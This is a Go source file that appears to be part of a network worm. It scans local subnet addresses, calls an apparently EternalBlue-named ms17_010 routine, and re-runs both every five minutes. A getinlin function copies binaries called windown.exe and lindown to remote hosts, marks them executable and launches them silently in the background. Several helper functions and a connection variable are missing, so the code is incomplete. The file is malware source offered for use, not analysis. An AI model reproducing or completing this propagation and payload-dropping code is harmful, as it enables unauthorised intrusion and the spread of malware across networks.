package main

import
(
	"regexp"
	"github.com/syossan27/tebata"
	"syscall"
	"runtime"
	"time"
	"os"
	"os/exec"
	"fmt"
	"sync"
)

func main() {
	t := tebata.New(syscall.SIGINT, syscall.SIGTERM, syscall.SIGABRT, syscall.SIGKILL)
	t.Reserve(handler1)
	myos := runtime.GOOS
	ms17_010()
	startwormingboi(myos)
	for len(os.Args) == 1 {
		time.Sleep(5 * time.Minute)
		ms17_010()
		startwormingboi(myos)
	}
}

func startwormingboi(myos string) {

	var subnets = ""
	if len(os.Args) == 1 {
		subnets = GetOutboundIP()
	} else {
		subnets = os.Args[1]
	}
	//Create random ips
	var step = [3]string{"10", "30", "40"}
	var myip = ""
	var wg sync.WaitGroup
	for _, element := range step {
		myip = subnets + element
		fmt.Println(myip)
		wg.Add(1)
		// CHANGEME
		targetos := "windows"
		go gettingin(myip, &wg, myos, targetos)
	}
	wg.Wait()
}

func getinlin(){

	session := newsession(connection)
	scpexec(session, "windown.exe", "\\Users\\Administrator\\AppData\\Roaming\\windown.exe")
	execlinuxcmd(session, "START /B \\Users\\Administrator\\AppData\\Roaming\\windown.exe")
	scpexec(session, "lindown", "/tmp/lindown")
	execlinuxcmd(session, "chmod +x /tmp/lindown")
	execlinuxcmd(session, "./tmp/lindown > /dev/null 2>&1 &")
	session.Close()
	return
}


